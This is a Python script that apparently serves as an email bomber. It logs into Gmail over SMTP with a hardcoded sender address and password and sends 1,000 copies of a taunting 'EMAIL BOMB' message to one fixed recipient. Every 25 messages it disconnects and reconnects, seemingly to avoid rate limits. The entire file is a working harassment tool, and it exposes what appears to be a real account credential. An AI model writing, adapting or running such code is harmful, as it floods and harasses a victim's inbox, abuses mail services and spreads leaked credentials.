import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import colorama

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def connect_email(sender_email, sender_password):
    try:
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        print(bcolors.RED + '\n+[+[+[ Starting ]+]+]+')
        return server
    except Exception as e:
        print("An error occurred while connecting:", str(e))
        return None
print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
def send_email(server, sender_email, recipient_email, subject, message, num_emails):
    try:
        for i in range(1, num_emails + 1):
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = recipient_email
            msg['Subject'] = f"{subject}  {i}"

            body = f"{message}"
            msg.attach(MIMEText(body, 'plain'))

            text = msg.as_string()
            server.sendmail(sender_email, recipient_email, text)
            print(bcolors.YELLOW + f'BOMB: {i}')

            if i % 25 == 0:
                disconnect_email(server)  
                time.sleep(10)  
                server = reconnect_email(sender_email, sender_password)
                time.sleep(10)  

            
            time.sleep(0.5)

    except Exception as e:
        print("An error occurred while sending email:", str(e))
        disconnect_email(server)  # Disconnect on error

def disconnect_email(server):
     try:
        time.sleep(10)  # Wait for 10 seconds before disconnecting
        server.quit()
        print(bcolors.RED + '\n+[+[+[ Reconnecting ]+]+]+')
     except Exception as e:
        print("An error occurred while disconnecting:", str(e))

def reconnect_email(sender_email, sender_password):
    retries = 0
    while True:
        if retries >= 5:  # Limit the number of retries
            print("Max retries reached. Exiting.")
            exit()
        server = connect_email(sender_email, sender_password)
        if server:
            return server
        else:
            print(f"Reconnecting in 10 seconds (Retry {retries + 1})...")
            time.sleep(10)
            retries += 1

# Input parameters
sender_email = "shoesnice80@gmail.com"
sender_password = "lebqagnlutommhdl"
recipient_email = "nassmpserver@gmail.com"
subject = "EMAIL BOMB"
message = "GET EMAIL BOMBED FOOL bro just dont give out your email lol"
num_emails = 1000

# Connect to the SMTP server
server = connect_email(sender_email, sender_password)

# Call the function to send the email
if server:
    send_email(server, sender_email, recipient_email, subject, message, num_emails)

# Disconnect from the SMTP server when done
if server:
    disconnect_email(server)
